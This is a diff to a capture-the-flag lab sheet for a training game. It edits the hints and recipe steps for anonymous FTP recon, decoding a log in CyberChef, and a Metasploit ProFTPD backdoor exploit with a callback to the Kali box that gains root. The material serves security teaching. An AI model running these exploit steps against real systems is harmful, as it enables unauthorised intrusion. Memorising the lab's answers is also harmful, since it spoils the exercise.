@@ -64,8 +64,8 @@ Your attack box is the Kali terminal in the server room. It is the only machine 
 
 The game gives you four flags. You submit each one at the SAFETYNET Drop-Site Terminal, which sits in the same room. Each flag unlocks more of the game, and the last one opens the staging cache.
 
-1. \==action: Open the VM Access Terminal in the server room==. This is the Kali box.
-2. \==action: Log in if the terminal asks you to==. The login for the Kali box is not written in this sheet. If the terminal does not show it, ask your tutor.
+1. \==action: Open the SAFETYNET Field Console in the server room==. This is the Kali box.
+2. \==action: Log in if the desktop asks you to==, using the login on the console's sticky note. This sheet does not repeat it.
 3. \==action: Open a shell== and check that you can reach the target with `ping -c 1 172.16.0.3`.
 
 > Tip: The end of Stage 4 is a natural stopping point for a 60-minute class. The ProFTPD backdoor is the longest stage, so it can start the next session.
@@ -200,7 +200,7 @@ The address and the server's software version are in the IT department's notes a
 <details markdown="1">
 <summary>Nudge</summary>
 
-Connect with the anonymous account and list the folder. One file is a notice from the backup server. It names the software version, the public folders and a restricted folder on the server. Read it. The notice gives you the next target.
+Connect with the anonymous account and list the folder. There is one file, a notice from the backup server. It names the software version, the public folders and a restricted folder on the server. Read it all the way to the end: the flag follows the notice, and below that is a block of encoded text you will need in Stage 4. The notice gives you the next target.
 
 **To learn more in game:** ask Agent HaX for the reconnaissance guide. It covers scanning and reading a service before you attack it. The published copy is at [Reconnaissance and Network Mapping](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/reconnaissance-and-network-mapping/).
 
@@ -251,12 +251,12 @@ Hydra can also test the three candidates for you. Make a short file with one can
 
 **Where:** the Kali shell, then the Drop-Site Terminal. **Goal:** recover Ghost's encoded operational log over anonymous FTP and decode it.
 
-> Hint: The notice pointed at a restricted folder. The log is encoded, so the file alone is not readable. What tool turns an encoded file back into text?
+> Hint: You already have the log. It is the encoded block at the end of the notice file from Stage 2. What tool turns encoded text back into readable text?
 
 <details markdown="1">
 <summary>Nudge</summary>
 
-Use the same anonymous FTP connection from Stage 2. The notice names the folder the log lives in, and the log is readable without root. Download it, then decode it in CyberChef. The flag is inside the decoded text, not in the encoded text.
+Use the notice file you downloaded over anonymous FTP in Stage 2; no root is needed. Below the notice and its plain flag is a block of encoded text. That block is Ghost's operational log. Paste only that block into CyberChef and decode it. The flag is inside the decoded text, not in the encoded text.
 
 **Learn it:** ==action: Before you use CyberChef, look at the characters in the file.== Are they all letters? Is there a regular pattern? Note your guess, then try the recipe.
 
@@ -267,8 +267,8 @@ Use the same anonymous FTP connection from Stage 2. The notice names the folder 
 <details markdown="1">
 <summary>Recipe</summary>
 
-1. \==action: Connect to FTP as anonymous== again, and `get` the encoded log.
-2. \==action: Open CyberChef== and paste the file's text into **Input**.
+1. \==action: Open the notice file from Stage 2== (or `get` it again over anonymous FTP) and copy the encoded block below the notice and its flag.
+2. \==action: Open CyberChef== and paste the encoded block into **Input**.
 3. \==action: Try the **Magic** operation==, or add the decoding operation that matches the pattern you noted.
 4. \==action: Copy the flag from the decoded text== and submit it at the SAFETYNET Drop-Site Terminal.
 
@@ -302,7 +302,7 @@ Start Metasploit and search for `proftpd`. Pick the module whose name describes 
 4. \==action: Set the target==: `set RHOST 172.16.0.3`, and the port the service uses.
 5. \==action: Set the callback address to the Kali box==: `set LHOST 172.16.0.2`, and a free port for `LPORT`.
 6. \==action: Run the exploit== with `exploit`. Then run `whoami` in the new session. It should show root.
-7. \==action: Read the root-only deployment log== and submit its flag at the SAFETYNET Drop-Site Terminal.
+7. \==action: Read the root-only deployment log== and submit its flag at the SAFETYNET Drop-Site Terminal. The log is a file directly in `/root`, and its name is generated for your game, so list the folder with `ls -la /root` rather than guessing a path.
 
 </details>
 
